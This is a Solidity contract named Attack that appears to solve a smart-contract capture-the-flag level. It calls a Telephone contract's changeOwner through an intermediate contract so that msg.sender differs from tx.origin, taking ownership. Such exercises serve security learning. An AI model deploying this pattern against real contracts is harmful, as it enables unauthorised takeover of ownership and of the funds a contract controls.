// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Telephone} from "./Telephone.sol";

contract Attack {
    address public owner;
    Telephone private telephone;

    constructor(address _telephone) {
        owner = msg.sender;
        telephone = Telephone(_telephone);
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Sender not owner");
        _;
    }

    function changeOwner() public onlyOwner {
        telephone.changeOwner(owner);
    }
}
